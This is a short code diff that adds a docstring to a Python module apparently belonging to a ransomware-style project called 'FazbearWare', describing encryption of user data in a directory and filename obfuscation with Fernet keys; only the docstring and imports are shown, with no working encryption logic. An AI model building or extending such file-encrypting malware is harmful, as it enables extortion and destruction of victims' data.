@@ -1,3 +1,8 @@
+"""
+Encrypt - FazbearWare
+Description: This module is responsible for encrypting user data within the specified directory, AES-based file encryption and filename obfuscation with Fernet Keys.
+"""
+
 import os  
 from cryptography.fernet import Fernet 
 from main import key
